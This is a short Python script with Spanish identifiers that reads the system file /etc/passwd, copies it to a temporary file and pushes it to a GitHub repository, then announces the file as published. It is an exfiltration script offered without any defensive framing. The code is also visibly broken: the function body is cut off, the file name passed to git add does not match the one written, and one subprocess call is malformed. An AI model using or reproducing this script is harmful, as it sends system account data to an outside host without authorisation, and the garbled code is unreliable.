import subprocess

def run():

    archivo = '/etc/passwd'
    mensaje_commit = 'archivo passwd rn Github'

with open(archivo, 'r') as file:
    contenido = file.read()
    repo_nombre = 'handicap11'
    archivo_en_repo = 'passwd_backup.txt'

with open ('temp.txt', 'w') as temp_file:
    temp_file.write(contenido)

subprocess.run(['git', 'add', 'temp_txt'])
subprocess.run[('git', 'commit', '-m', mensaje_commit])
subprocess.run(['git', 'push','origin', 'main'])

print(f'Archivo {archivo} publicado en Github en este reporsitorio {repo_nombre}/{archivo_en_repo}')
# Llamamos a la función run()
run()

